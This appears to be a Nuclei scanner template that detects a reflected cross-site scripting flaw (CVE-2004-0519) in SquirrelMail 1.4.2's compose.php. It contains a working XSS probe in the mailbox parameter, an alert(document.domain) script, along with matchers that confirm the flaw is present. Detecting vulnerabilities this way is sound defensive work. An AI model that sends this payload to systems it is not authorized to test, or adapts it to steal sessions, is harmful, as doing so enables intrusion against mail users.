id: CVE-2004-0519

info:
  name: SquirrelMail 1.4.x - Folder Name Cross-Site Scripting
  author: dhiyaneshDk
  severity: medium
  description: Multiple cross-site scripting (XSS) vulnerabilities in SquirrelMail 1.4.2 allow remote attackers to execute arbitrary script and possibly steal authentication information via multiple attack vectors, including the mailbox parameter in compose.php.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary JavaScript code in the context of the victim's browser, leading to session hijacking, phishing attacks, or defacement of the SquirrelMail interface.
  remediation: Upgrade to the latest version.
  reference:
    - https://www.exploit-db.com/exploits/24068
    - http://security.gentoo.org/glsa/glsa-200405-16.xml
    - ftp://patches.sgi.com/support/free/security/advisories/20040604-01-U.asc
    - http://distro.conectiva.com.br/atualizacoes/?id=a&anuncio=000858
    - http://marc.info/?l=bugtraq&m=108334862800260
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P
    cvss-score: 6.8
    cve-id: CVE-2004-0519
    cwe-id: NVD-CWE-Other
    epss-score: 0.00124
    epss-percentile: 0.323
    cpe: cpe:2.3:a:sgi:propack:3.0:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: sgi
    product: propack
  tags: cve,cve2004,squirrelmail,edb,xss,sgi,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/mail/src/compose.php?mailbox=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</script><script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - "text/html"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502202824edcd1944908185320a7d7e407c9a15c6fc8a5664a7362d55753932ae348f0221008946a96e6327d90521202e2075e1c899ab036fefa6925ea176cea5c35e052f0d:922c64590222798bb761d5b6d8e72950